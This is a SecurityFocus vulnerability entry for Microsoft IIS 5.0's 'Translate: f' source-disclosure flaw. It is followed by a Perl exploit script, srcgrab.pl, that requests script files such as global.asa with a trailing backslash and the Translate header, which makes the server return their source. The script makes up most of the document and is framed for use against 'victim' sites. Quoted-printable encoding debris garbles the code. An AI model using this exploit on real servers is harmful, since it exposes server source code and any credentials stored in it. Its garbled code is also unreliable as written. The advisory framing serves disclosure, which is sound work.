source: http://www.securityfocus.com/bid/1578/info

Microsoft IIS 5.0 has a dedicated scripting engine for advanced file types such as ASP, ASA, HTR, etc. files. The scripting engines handle requests for these file types, processes them accordingly, and then executes them on the server.

It is possible to force the server to send back the source of known scriptable files to the client if the HTTP GET request contains a specialized header with 'Translate: f' at the end of it, and if a trailing slash '/' is appended to the end of the URL. The scripting engine will be able to locate the requested file, however, it will not recognize it as a file that needs to be processed and will proceed to send the file source to the client.

#!/usr/bin/perl
# Expl0it By smiler@vxd.org
# Tested with sucess against IIS 5.0. Maybe it works against IIS 4.0 =
using a shared drive but I haven=B4t tested it yet.
# Get the source code of any script from the server using this exploit.
# This code was written after Daniel Docekal brought this issue in =
BugTraq.
# Cheers 351 and FractalG :)

if (not $ARGV[0]) {
print qq~
Geee it=B4s running !! kewl :)))
Usage : srcgrab.pl <complete url of file to retrieve>
Example Usage : srcgrab.pl http://www.victimsite.com/global.asa
U can also save the retrieved file using : srcgrab.pl =
http://www.victim.com/default.asp > file_to_save
~; exit;}


$victimurl=3D$ARGV[0];

         # Create a user agent object
         use LWP::UserAgent;
         $ua =3D new LWP::UserAgent;

        # Create a request
        my $req =3D new HTTP::Request GET =3D> $victimurl . '\\'; # Here =
is the backslash at the end of the url ;)
        $req->content_type('application/x-www-form-urlencoded');
        $req->content_type('text/html');
        $req->header(Translate =3D> 'f'); # Here is the famous translate =
header :))
        $req->content('match=3Dwww&errors=3D0');

         # Pass request to the user agent and get a response back
         my $res =3D $ua->request($req);

         # Check the outcome of the response
         if ($res->is_success) {
             print $res->content;
         } else {
             print $res->error_as_HTML;
         }
